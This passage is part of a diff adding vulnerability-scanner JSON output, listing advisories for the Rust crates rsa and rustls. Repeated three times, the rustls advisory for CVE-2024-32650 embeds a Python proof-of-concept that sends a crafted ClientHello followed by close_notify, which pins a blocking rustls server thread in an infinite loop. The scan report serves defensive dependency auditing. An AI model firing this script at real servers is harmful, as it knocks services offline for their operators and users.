+                    "cvss": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
+                    "informational": null,
+                    "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2023-0071.json"
+                  },
+                  "ecosystem_specific": {
+                    "affected_functions": null,
+                    "affects": {
+                      "arch": [],
+                      "functions": [],
+                      "os": []
+                    }
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "PACKAGE",
+                  "url": "https://crates.io/crates/rsa"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2023-0071.html"
+                },
+                {
+                  "type": "REPORT",
+                  "url": "https://github.com/RustCrypto/RSA/issues/19#issuecomment-1822995643"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://people.redhat.com/~hkario/marvin/"
+                }
+              ],
+              "database_specific": {
+                "license": "CC0-1.0"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-4grx-2x9w-596c",
+                "GHSA-c38w-74pg-36hr",
+                "RUSTSEC-2023-0071"
+              ],
+              "aliases": [
+                "CVE-2023-49092",
+                "GHSA-4grx-2x9w-596c",
+                "GHSA-c38w-74pg-36hr",
+                "RUSTSEC-2023-0071"
+              ],
+              "max_severity": "5.9"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "rustls",
+            "version": "0.21.10",
+            "ecosystem": "crates.io"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-05-21T17:23:33Z",
+              "published": "2024-04-19T19:46:57Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-6g7w-8wpp-frhj",
+              "aliases": [
+                "CVE-2024-32650",
+                "RUSTSEC-2024-0336"
+              ],
+              "related": [
+                "CGA-339p-8wph-9rvh",
+                "CGA-h2jp-wrjf-7php",
+                "CGA-mx8x-g2gv-8xrq",
+                "CGA-qpj4-gwrp-pjfc"
+              ],
+              "summary": "Denial of Service Vulnerability in Rustls Library",
+              "details": "### Summary\n`rustls::ConnectionCommon::complete_io` could fall into an infinite loop based on network input.\n\n### Details\n\nVerified at `0.22` and `0.23` `rustls`, but `0.21` and `0.20` release lines are also affected. `tokio-rustls` and `rustls-ffi` do not call `complete_io` and are not affected. `rustls::Stream` and `rustls::StreamOwned` types use `complete_io` and are affected.\n\nWhen using a blocking rustls server, if a client send a `close_notify` message immediately after `client_hello`, the server's `complete_io` will get in an infinite loop where:\n\n- `eof`: false\n- `until_handshaked`: true\n- `self.is_handshaking()`: true\n- `self.wants_write()`: false\n- `self.wants_read()`: false\n\n\n### PoC\n\n1. Run simple server: `cargo run --bin simpleserver test-ca/rsa/end.fullchain test-ca/rsa/end.key`\n2. Run following python script\n    ```python3\n    #!/usr/bin/env python3\n    \n    import socket\n    \n    sock = socket.socket()\n    sock.connect((\"localhost\", 4443))\n    \n    print(\"Sending client hello...\")\n    \n    # Fake handshake data of a client hello message.\n    fake_handshake = \"\"\"\n    1603 0100 c801 0000 c403 03ec 12dd\n    1764 a439 fd7e 8c85 46b8 4d1e a06e b3d7\n    a051 f03c b817 470d 4c54 c5df 7200 001c\n    eaea c02b c02f c02c c030 cca9 cca8 c013\n    c014 009c 009d 002f 0035 000a 0100 007f\n    dada 0000 ff01 0001 0000 0000 1600 1400\n    0011 7777 772e 7769 6b69 7065 6469 612e\n    6f72 6700 1700 0000 2300 0000 0d00 1400\n    1204 0308 0404 0105 0308 0505 0108 0606\n    0102 0100 0500 0501 0000 0000 0012 0000\n    0010 000e 000c 0268 3208 6874 7470 2f31\n    2e31 7550 0000 000b 0002 0100 000a 000a\n    0008 1a1a 001d 0017 0018 1a1a 0001 00\n    \"\"\"\n    \n    \n    def parse_fake_handshake():\n        i = 0\n        data = bytearray()\n        while i \u003c len(fake_handshake):\n            while i \u003c len(fake_handshake) and fake_handshake[i].isspace():\n                i += 1\n            if i \u003e= len(fake_handshake):\n                return data\n    \n            c1 = fake_handshake[i]\n            c2 = fake_handshake[i + 1]\n            i += 2\n    \n            data.append(int(c1, 16) * 16 + int(c2, 16))\n        return data\n    \n    \n    data = parse_fake_handshake()\n    \n    print(\"Fake client hello:\", data)\n    \n    sock.send(data)\n    \n    # Send close_notify alert that we're closing the connection.\n    close_data = bytearray([0x15, 0x03, 0x03, 0x00, 0x02, 0x01, 0x00])\n    print(f\"close_notify is {close_data}\")\n    sock.send(close_data)\n    print(\"close_notify sent\")\n    \n    exit(0)\n    ```\n4. You could observe the server process get into 100% cpu usage, and if you add logging at beginning of `rustls::conn::ConnectionCommon::complete_io`, you could see the function is spinning.\n\nAlso note that the server thread is stuck in this infinite loop even if the client closes the socket.\n\n### Impact\n\nThis is a DOS.\n\nA multithread non-async server that uses `rustls` could be attacked by getting few requests like above (each request could cause one thread to spin) and stop handling normal requests.\n",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "rustls",
+                    "purl": "pkg:cargo/rustls"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0.23.0"
+                        },
+                        {
+                          "fixed": "0.23.5"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 0.23.4",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-6g7w-8wpp-frhj/GHSA-6g7w-8wpp-frhj.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "rustls",
+                    "purl": "pkg:cargo/rustls"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0.22.0"
+                        },
+                        {
+                          "fixed": "0.22.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 0.22.3",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-6g7w-8wpp-frhj/GHSA-6g7w-8wpp-frhj.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "rustls",
+                    "purl": "pkg:cargo/rustls"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0.21.0"
+                        },
+                        {
+                          "fixed": "0.21.11"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 0.21.10",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-6g7w-8wpp-frhj/GHSA-6g7w-8wpp-frhj.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "rustls",
+                    "purl": "pkg:cargo/rustls"
+                  },
+                  "versions": [
+                    "0.20"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-6g7w-8wpp-frhj/GHSA-6g7w-8wpp-frhj.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rustls/rustls/security/advisories/GHSA-6g7w-8wpp-frhj"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-32650"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rustls/rustls/commit/2123576840aa31043a31b0770e6572136fbe0c2d"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rustls/rustls/commit/5374108df698e78c3e9ef8265cac311556be24af"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rustls/rustls/commit/6e938bcfe82a9da7a2e1cbf10b928c7eca26426e"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rustls/rustls/commit/ebcb4782f23b4edf9b10a7065d9e8d4362439d9c"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rustls/rustls/commit/f45664fbded03d833dffd806503d3c8becd1b71e"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/rustls/rustls"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2024-0336.html"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-835"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-04-19T19:46:57Z",
+                "nvd_published_at": "2024-04-19T16:15:10Z",
+                "severity": "HIGH"
+              }
+            },
+            {
+              "modified": "2024-04-20T02:21:14Z",
+              "published": "2024-04-19T12:00:00Z",
+              "schema_version": "1.6.0",
+              "id": "RUSTSEC-2024-0336",
+              "aliases": [
+                "CVE-2024-32650",
+                "GHSA-6g7w-8wpp-frhj"
+              ],
+              "summary": "`rustls::ConnectionCommon::complete_io` could fall into an infinite loop based on network input",
+              "details": "If a `close_notify` alert is received during a handshake, `complete_io`\ndoes not terminate.\n\nCallers which do not call `complete_io` are not affected.\n\n`rustls-tokio` and `rustls-ffi` do not call `complete_io`\nand are not affected.\n\n`rustls::Stream` and `rustls::StreamOwned` types use\n`complete_io` and are affected.",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "rustls",
+                    "purl": "pkg:cargo/rustls"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0.0.0-0"
+                        },
+                        {
+                          "fixed": "0.21.11"
+                        },
+                        {
+                          "introduced": "0.22.0"
+                        },
+                        {
+                          "fixed": "0.22.4"
+                        },
+                        {
+                          "introduced": "0.23.0"
+                        },
+                        {
+                          "fixed": "0.23.5"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "categories": [
+                      "denial-of-service"
+                    ],
+                    "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                    "informational": null,
+                    "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2024-0336.json"
+                  },
+                  "ecosystem_specific": {
+                    "affected_functions": null,
+                    "affects": {
+                      "arch": [],
+                      "functions": [
+                        "rustls::ConnectionCommon::complete_io"
+                      ],
+                      "os": []
+                    }
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                }
+              ],
+              "references": [
+                {
+                  "type": "PACKAGE",
+                  "url": "https://crates.io/crates/rustls"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2024-0336.html"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://github.com/rustls/rustls/security/advisories/GHSA-6g7w-8wpp-frhj"
+                }
+              ],
+              "database_specific": {
+                "license": "CC0-1.0"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-6g7w-8wpp-frhj",
+                "RUSTSEC-2024-0336"
+              ],
+              "aliases": [
+                "CVE-2024-32650",
+                "GHSA-6g7w-8wpp-frhj",
+                "RUSTSEC-2024-0336"
+              ],
+              "max_severity": "7.5"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "rustls",
+            "version": "0.22.3",
+            "ecosystem": "crates.io"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-05-21T17:23:33Z",
+              "published": "2024-04-19T19:46:57Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-6g7w-8wpp-frhj",
+              "aliases": [
+                "CVE-2024-32650",
+                "RUSTSEC-2024-0336"
+              ],
+              "related": [
+                "CGA-339p-8wph-9rvh",
+                "CGA-h2jp-wrjf-7php",
+                "CGA-mx8x-g2gv-8xrq",
+                "CGA-qpj4-gwrp-pjfc"
+              ],
+              "summary": "Denial of Service Vulnerability in Rustls Library",
+              "details": "### Summary\n`rustls::ConnectionCommon::complete_io` could fall into an infinite loop based on network input.\n\n### Details\n\nVerified at `0.22` and `0.23` `rustls`, but `0.21` and `0.20` release lines are also affected. `tokio-rustls` and `rustls-ffi` do not call `complete_io` and are not affected. `rustls::Stream` and `rustls::StreamOwned` types use `complete_io` and are affected.\n\nWhen using a blocking rustls server, if a client send a `close_notify` message immediately after `client_hello`, the server's `complete_io` will get in an infinite loop where:\n\n- `eof`: false\n- `until_handshaked`: true\n- `self.is_handshaking()`: true\n- `self.wants_write()`: false\n- `self.wants_read()`: false\n\n\n### PoC\n\n1. Run simple server: `cargo run --bin simpleserver test-ca/rsa/end.fullchain test-ca/rsa/end.key`\n2. Run following python script\n    ```python3\n    #!/usr/bin/env python3\n    \n    import socket\n    \n    sock = socket.socket()\n    sock.connect((\"localhost\", 4443))\n    \n    print(\"Sending client hello...\")\n    \n    # Fake handshake data of a client hello message.\n    fake_handshake = \"\"\"\n    1603 0100 c801 0000 c403 03ec 12dd\n    1764 a439 fd7e 8c85 46b8 4d1e a06e b3d7\n    a051 f03c b817 470d 4c54 c5df 7200 001c\n    eaea c02b c02f c02c c030 cca9 cca8 c013\n    c014 009c 009d 002f 0035 000a 0100 007f\n    dada 0000 ff01 0001 0000 0000 1600 1400\n    0011 7777 772e 7769 6b69 7065 6469 612e\n    6f72 6700 1700 0000 2300 0000 0d00 1400\n    1204 0308 0404 0105 0308 0505 0108 0606\n    0102 0100 0500 0501 0000 0000 0012 0000\n    0010 000e 000c 0268 3208 6874 7470 2f31\n    2e31 7550 0000 000b 0002 0100 000a 000a\n    0008 1a1a 001d 0017 0018 1a1a 0001 00\n    \"\"\"\n    \n    \n    def parse_fake_handshake():\n        i = 0\n        data = bytearray()\n        while i \u003c len(fake_handshake):\n            while i \u003c len(fake_handshake) and fake_handshake[i].isspace():\n                i += 1\n            if i \u003e= len(fake_handshake):\n                return data\n    \n            c1 = fake_handshake[i]\n            c2 = fake_handshake[i + 1]\n            i += 2\n    \n            data.append(int(c1, 16) * 16 + int(c2, 16))\n        return data\n    \n    \n    data = parse_fake_handshake()\n    \n    print(\"Fake client hello:\", data)\n    \n    sock.send(data)\n    \n    # Send close_notify alert that we're closing the connection.\n    close_data = bytearray([0x15, 0x03, 0x03, 0x00, 0x02, 0x01, 0x00])\n    print(f\"close_notify is {close_data}\")\n    sock.send(close_data)\n    print(\"close_notify sent\")\n    \n    exit(0)\n    ```\n4. You could observe the server process get into 100% cpu usage, and if you add logging at beginning of `rustls::conn::ConnectionCommon::complete_io`, you could see the function is spinning.\n\nAlso note that the server thread is stuck in this infinite loop even if the client closes the socket.\n\n### Impact\n\nThis is a DOS.\n\nA multithread non-async server that uses `rustls` could be attacked by getting few requests like above (each request could cause one thread to spin) and stop handling normal requests.\n",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "rustls",
+                    "purl": "pkg:cargo/rustls"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0.23.0"
+                        },
+                        {
+                          "fixed": "0.23.5"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 0.23.4",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-6g7w-8wpp-frhj/GHSA-6g7w-8wpp-frhj.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "rustls",
+                    "purl": "pkg:cargo/rustls"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0.22.0"
+                        },
+                        {
+                          "fixed": "0.22.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 0.22.3",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-6g7w-8wpp-frhj/GHSA-6g7w-8wpp-frhj.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "rustls",
+                    "purl": "pkg:cargo/rustls"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0.21.0"
+                        },
+                        {
+                          "fixed": "0.21.11"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 0.21.10",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-6g7w-8wpp-frhj/GHSA-6g7w-8wpp-frhj.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "rustls",
+                    "purl": "pkg:cargo/rustls"
+                  },
+                  "versions": [
+                    "0.20"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-6g7w-8wpp-frhj/GHSA-6g7w-8wpp-frhj.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rustls/rustls/security/advisories/GHSA-6g7w-8wpp-frhj"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-32650"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rustls/rustls/commit/2123576840aa31043a31b0770e6572136fbe0c2d"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rustls/rustls/commit/5374108df698e78c3e9ef8265cac311556be24af"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rustls/rustls/commit/6e938bcfe82a9da7a2e1cbf10b928c7eca26426e"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rustls/rustls/commit/ebcb4782f23b4edf9b10a7065d9e8d4362439d9c"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rustls/rustls/commit/f45664fbded03d833dffd806503d3c8becd1b71e"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/rustls/rustls"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2024-0336.html"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-835"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-04-19T19:46:57Z",
+                "nvd_published_at": "2024-04-19T16:15:10Z",
+                "severity": "HIGH"
+              }
+            },
+            {
+              "modified": "2024-04-20T02:21:14Z",
+              "published": "2024-04-19T12:00:00Z",
+              "schema_version": "1.6.0",
+              "id": "RUSTSEC-2024-0336",
+              "aliases": [
+                "CVE-2024-32650",
+                "GHSA-6g7w-8wpp-frhj"
+              ],
+              "summary": "`rustls::ConnectionCommon::complete_io` could fall into an infinite loop based on network input",
+              "details": "If a `close_notify` alert is received during a handshake, `complete_io`\ndoes not terminate.\n\nCallers which do not call `complete_io` are not affected.\n\n`rustls-tokio` and `rustls-ffi` do not call `complete_io`\nand are not affected.\n\n`rustls::Stream` and `rustls::StreamOwned` types use\n`complete_io` and are affected.",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "rustls",
+                    "purl": "pkg:cargo/rustls"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0.0.0-0"
+                        },
+                        {
+                          "fixed": "0.21.11"
+                        },
+                        {
+                          "introduced": "0.22.0"
+                        },
+                        {
+                          "fixed": "0.22.4"
+                        },
+                        {
+                          "introduced": "0.23.0"
+                        },
+                        {
+                          "fixed": "0.23.5"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "categories": [
+                      "denial-of-service"
+                    ],
+                    "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                    "informational": null,
+                    "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2024-0336.json"
+                  },
+                  "ecosystem_specific": {
+                    "affected_functions": null,
+                    "affects": {
+                      "arch": [],
+                      "functions": [
+                        "rustls::ConnectionCommon::complete_io"
+                      ],
+                      "os": []
+                    }
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                }
+              ],
+              "references": [
+                {
+                  "type": "PACKAGE",
+                  "url": "https://crates.io/crates/rustls"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2024-0336.html"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://github.com/rustls/rustls/security/advisories/GHSA-6g7w-8wpp-frhj"
+                }
+              ],
+              "database_specific": {
+                "license": "CC0-1.0"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-6g7w-8wpp-frhj",
+                "RUSTSEC-2024-0336"
+              ],
+              "aliases": [
+                "CVE-2024-32650",
+                "GHSA-6g7w-8wpp-frhj",
+                "RUSTSEC-2024-0336"
+              ],
+              "max_severity": "7.5"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "rustls",
+            "version": "0.23.4",
+            "ecosystem": "crates.io"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-05-21T17:23:33Z",
+              "published": "2024-04-19T19:46:57Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-6g7w-8wpp-frhj",
+              "aliases": [
+                "CVE-2024-32650",
+                "RUSTSEC-2024-0336"
+              ],
+              "related": [
+                "CGA-339p-8wph-9rvh",
+                "CGA-h2jp-wrjf-7php",
+                "CGA-mx8x-g2gv-8xrq",
+                "CGA-qpj4-gwrp-pjfc"
+              ],
+              "summary": "Denial of Service Vulnerability in Rustls Library",
+              "details": "### Summary\n`rustls::ConnectionCommon::complete_io` could fall into an infinite loop based on network input.\n\n### Details\n\nVerified at `0.22` and `0.23` `rustls`, but `0.21` and `0.20` release lines are also affected. `tokio-rustls` and `rustls-ffi` do not call `complete_io` and are not affected. `rustls::Stream` and `rustls::StreamOwned` types use `complete_io` and are affected.\n\nWhen using a blocking rustls server, if a client send a `close_notify` message immediately after `client_hello`, the server's `complete_io` will get in an infinite loop where:\n\n- `eof`: false\n- `until_handshaked`: true\n- `self.is_handshaking()`: true\n- `self.wants_write()`: false\n- `self.wants_read()`: false\n\n\n### PoC\n\n1. Run simple server: `cargo run --bin simpleserver test-ca/rsa/end.fullchain test-ca/rsa/end.key`\n2. Run following python script\n    ```python3\n    #!/usr/bin/env python3\n    \n    import socket\n    \n    sock = socket.socket()\n    sock.connect((\"localhost\", 4443))\n    \n    print(\"Sending client hello...\")\n    \n    # Fake handshake data of a client hello message.\n    fake_handshake = \"\"\"\n    1603 0100 c801 0000 c403 03ec 12dd\n    1764 a439 fd7e 8c85 46b8 4d1e a06e b3d7\n    a051 f03c b817 470d 4c54 c5df 7200 001c\n    eaea c02b c02f c02c c030 cca9 cca8 c013\n    c014 009c 009d 002f 0035 000a 0100 007f\n    dada 0000 ff01 0001 0000 0000 1600 1400\n    0011 7777 772e 7769 6b69 7065 6469 612e\n    6f72 6700 1700 0000 2300 0000 0d00 1400\n    1204 0308 0404 0105 0308 0505 0108 0606\n    0102 0100 0500 0501 0000 0000 0012 0000\n    0010 000e 000c 0268 3208 6874 7470 2f31\n    2e31 7550 0000 000b 0002 0100 000a 000a\n    0008 1a1a 001d 0017 0018 1a1a 0001 00\n    \"\"\"\n    \n    \n    def parse_fake_handshake():\n        i = 0\n        data = bytearray()\n        while i \u003c len(fake_handshake):\n            while i \u003c len(fake_handshake) and fake_handshake[i].isspace():\n                i += 1\n            if i \u003e= len(fake_handshake):\n                return data\n    \n            c1 = fake_handshake[i]\n            c2 = fake_handshake[i + 1]\n            i += 2\n    \n            data.append(int(c1, 16) * 16 + int(c2, 16))\n        return data\n    \n    \n    data = parse_fake_handshake()\n    \n    print(\"Fake client hello:\", data)\n    \n    sock.send(data)\n    \n    # Send close_notify alert that we're closing the connection.\n    close_data = bytearray([0x15, 0x03, 0x03, 0x00, 0x02, 0x01, 0x00])\n    print(f\"close_notify is {close_data}\")\n    sock.send(close_data)\n    print(\"close_notify sent\")\n    \n    exit(0)\n    ```\n4. You could observe the server process get into 100% cpu usage, and if you add logging at beginning of `rustls::conn::ConnectionCommon::complete_io`, you could see the function is spinning.\n\nAlso note that the server thread is stuck in this infinite loop even if the client closes the socket.\n\n### Impact\n\nThis is a DOS.\n\nA multithread non-async server that uses `rustls` could be attacked by getting few requests like above (each request could cause one thread to spin) and stop handling normal requests.\n",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "rustls",
+                    "purl": "pkg:cargo/rustls"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0.23.0"
+                        },
+                        {
+                          "fixed": "0.23.5"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 0.23.4",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-6g7w-8wpp-frhj/GHSA-6g7w-8wpp-frhj.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "rustls",
+                    "purl": "pkg:cargo/rustls"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0.22.0"
+                        },
+                        {
+                          "fixed": "0.22.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 0.22.3",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-6g7w-8wpp-frhj/GHSA-6g7w-8wpp-frhj.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "rustls",
+                    "purl": "pkg:cargo/rustls"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0.21.0"
+                        },
+                        {
+                          "fixed": "0.21.11"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 0.21.10",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-6g7w-8wpp-frhj/GHSA-6g7w-8wpp-frhj.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "rustls",
+                    "purl": "pkg:cargo/rustls"
+                  },
+                  "versions": [
+                    "0.20"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-6g7w-8wpp-frhj/GHSA-6g7w-8wpp-frhj.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rustls/rustls/security/advisories/GHSA-6g7w-8wpp-frhj"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-32650"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rustls/rustls/commit/2123576840aa31043a31b0770e6572136fbe0c2d"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rustls/rustls/commit/5374108df698e78c3e9ef8265cac311556be24af"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rustls/rustls/commit/6e938bcfe82a9da7a2e1cbf10b928c7eca26426e"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rustls/rustls/commit/ebcb4782f23b4edf9b10a7065d9e8d4362439d9c"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rustls/rustls/commit/f45664fbded03d833dffd806503d3c8becd1b71e"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/rustls/rustls"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2024-0336.html"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-835"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-04-19T19:46:57Z",
+                "nvd_published_at": "2024-04-19T16:15:10Z",
+                "severity": "HIGH"
+              }
+            },
+            {
+              "modified": "2024-04-20T02:21:14Z",
+              "published": "2024-04-19T12:00:00Z",
+              "schema_version": "1.6.0",
+              "id": "RUSTSEC-2024-0336",
+              "aliases": [
+                "CVE-2024-32650",
+                "GHSA-6g7w-8wpp-frhj"
+              ],
+              "summary": "`rustls::ConnectionCommon::complete_io` could fall into an infinite loop based on network input",
+              "details": "If a `close_notify` alert is received during a handshake, `complete_io`\ndoes not terminate.\n\nCallers which do not call `complete_io` are not affected.\n\n`rustls-tokio` and `rustls-ffi` do not call `complete_io`\nand are not affected.\n\n`rustls::Stream` and `rustls::StreamOwned` types use\n`complete_io` and are affected.",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "rustls",
+                    "purl": "pkg:cargo/rustls"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
